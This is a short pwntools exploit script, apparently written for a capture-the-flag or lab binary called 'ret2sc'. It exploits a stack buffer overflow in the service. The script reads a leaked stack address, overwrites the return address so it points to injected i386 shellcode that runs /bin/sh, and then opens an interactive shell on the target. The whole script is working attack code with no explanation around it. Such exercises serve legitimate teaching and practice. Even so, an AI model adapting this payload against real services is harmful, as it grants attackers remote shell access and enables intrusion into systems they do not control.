#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(arch='i386', os='linux') # i386, amd64
_ATT = 0
_local = 0

host = "127.0.0.1"
port = "8888"

if _local:
	r = process('./ret2sc')
else:
	r = remote(host, port)

if _ATT:
	log.info('Waiting for attach...')
	raw_input()

print r.recvline()
stack = int(r.recvline(), 16)
print 'buf = {}'.format(stack)

payload = 'A'*32
payload += p32(stack+32+4)
payload += 'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
# payload += asm(shellcraft.sh())

print r.recv()
r.sendline(payload)
# print r.recv()
r.interactive()